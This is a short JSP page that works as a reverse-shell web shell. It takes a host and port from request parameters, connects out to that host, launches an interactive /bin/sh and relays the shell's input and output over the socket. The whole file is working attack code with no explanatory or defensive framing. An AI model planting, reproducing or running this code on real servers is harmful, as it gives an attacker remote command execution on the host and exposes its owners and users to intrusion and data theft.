<%@ page import="java.io.*,java.net.*" %>
<%
String host = request.getParameter("h");
int port = Integer.parseInt(request.getParameter("p"));
Socket socket = new Socket(host, port);
Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "/bin/sh -i"});
InputStream pi = p.getInputStream();
OutputStream po = p.getOutputStream();
InputStream si = socket.getInputStream();
OutputStream so = socket.getOutputStream();
while (!socket.isClosed()) {
    while (pi.available() > 0) so.write(pi.read());
    while (si.available() > 0) po.write(si.read());
    so.flush(); po.flush();
    Thread.sleep(50);
}
%>
